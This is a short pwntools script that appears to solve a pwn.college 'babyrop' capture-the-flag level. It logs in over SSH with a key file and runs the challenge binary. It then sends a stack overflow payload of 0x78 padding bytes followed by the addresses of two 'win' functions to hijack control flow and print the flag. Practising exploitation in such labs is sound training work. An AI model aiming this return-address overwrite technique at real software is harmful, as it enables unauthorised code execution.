from pwn import *

e = ELF('./babyrop_level2_testing1')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../key',port=22)

p = s.run('/babyrop_level2_testing1')

pay = b'A' * 0x78
pay += p64(e.symbols['win_stage_1'])
pay += p64(e.symbols['win_stage_2'])

p.sendafter(b'\n\n',pay)

p.recvuntil(b'you the flag!')
print(p.recv().decode().strip())